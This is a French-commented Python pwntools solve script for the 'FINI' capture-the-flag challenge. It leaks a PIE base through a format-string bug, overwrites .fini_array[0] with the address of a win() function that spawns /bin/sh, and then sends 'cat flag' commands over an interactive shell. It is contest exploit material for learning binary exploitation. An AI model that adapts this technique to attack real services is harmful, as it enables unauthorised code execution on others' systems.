#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# FINI (CTF@AC) – exploitation par .fini_array + fuite format string
# Usage: python3 solve_fini.py
#
# Nécessite: pip install pwntools

from pwn import *

HOST = "ctf.ac.upt.ro"
PORT = 9713

# Offsets issus de l'analyse publique du challenge:
OFF_MAIN       = 0x10b0   # main @ pieBase + 0x10b0
OFF_WIN        = 0x1380   # win  @ pieBase + 0x1380  => fait system("/bin/sh")
OFF_FINI_ARRAY = 0x31c8   # .fini_array[0] @ pieBase + 0x31c8
FMT_POS        = 31       # %31$lx fuite d'une addr PIE sur la stack

def leak_pie_base():
    """
    Fuite de l'adresse via format string, puis calcul de la base PIE.
    Si la première tentative ne donne pas une base page-alignée, on essaie quelques positions voisines.
    """
    for pos in [FMT_POS] + list(range(24, 45)):
        io = remote(HOST, PORT)
        io.recvuntil(b"What's your name?")
        io.sendline(f"%{pos}$lx".encode())

        # "Hello, <hex>\n!\n1) write\n2) exit\n> "
        io.recvuntil(b"Hello, ")
        leak_line = io.recvline().strip()  # ex: b'55ca370b20b0'
        try:
            leak = int(leak_line, 16)
        except ValueError:
            io.close()
            continue

        pie_base = leak - OFF_MAIN
        # Une base PIE raisonnable est page-alignée (bas 12 bits à 0)
        if (pie_base & 0xfff) == 0:
            log.success(f"FMT offset probable: %{pos}$lx")
            return io, pie_base

        # sinon, on retente avec une nouvelle connexion
        io.close()

    raise RuntimeError("Impossible de déterminer la base PIE automatiquement. Essaie un autre offset manuellement.")

def main():
    context.log_level = "info"

    io, pie_base = leak_pie_base()
    log.success(f"PIE base = {hex(pie_base)}")

    fini_array = pie_base + OFF_FINI_ARRAY
    win_addr   = pie_base + OFF_WIN

    log.info(f".fini_array[0] => {hex(fini_array)}")
    log.info(f"win()          => {hex(win_addr)}")

    # Utilise le menu pour écrire 8 octets à l'adresse de .fini_array[0]
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"Addr (hex): ")
    io.sendline(hex(fini_array).encode())
    io.recvuntil(b"Value (hex, 8 bytes): ")
    io.sendline(hex(win_addr).encode())

    # Déclenche les handlers de fin (._fini / .fini_array) -> win() -> /bin/sh
    io.recvuntil(b"> ")
    io.sendline(b"2")

    # Lis le flag — essaye plusieurs noms de fichier courants
    io.sendline(b"cat flag || cat flag.txt || cat /flag || ls -la")
    io.interactive()

if __name__ == "__main__":
    main()
